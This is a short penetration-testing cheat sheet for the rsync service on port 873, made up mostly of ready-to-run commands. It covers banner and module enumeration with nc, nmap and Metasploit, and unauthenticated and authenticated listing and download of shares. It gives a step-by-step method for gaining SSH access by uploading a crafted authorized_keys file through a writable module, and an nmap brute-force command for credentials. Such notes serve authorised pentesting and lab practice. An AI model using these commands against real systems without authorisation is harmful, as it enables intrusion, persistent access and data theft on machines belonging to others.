# 873 (rsync)

## Enumeration

### Banner

#### nc

```bash
nc -vn <IP> 873
```

### Modules

#### nmap

```bash
sudo nmap -sV --script "rsync-list-modules" -p 873 <IP>
```

#### Metasploit

```bash
msf> use auxiliary/scanner/rsync/modules_list
```

### rsync

Unauthenticated

```bash
rsync -av --list-only rsync://192.168.76.126/fox
rsync -av rsync://192.168.76.126/fox ./rsync/
```

Authenticated

```bash
rsync -av --list-only rsync://username@192.168.0.123/fox
rsync -av rsync://username@192.168.0.123:8730/fox ./rsync_shared
```

Upload a file (i.e. an authorized\_keys file to obtain access to a machine)

```bash
mkdir .ssh
ssh-keygen -f .ssh/fox-ssh -t ecdsa -b 521
cp .ssh/fox-ssh.pub .ssh/authorized_keys
rsync -av .ssh/ rsync://fox@192.168.76.126/fox/.ssh
```

## Brute Force

```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>

```

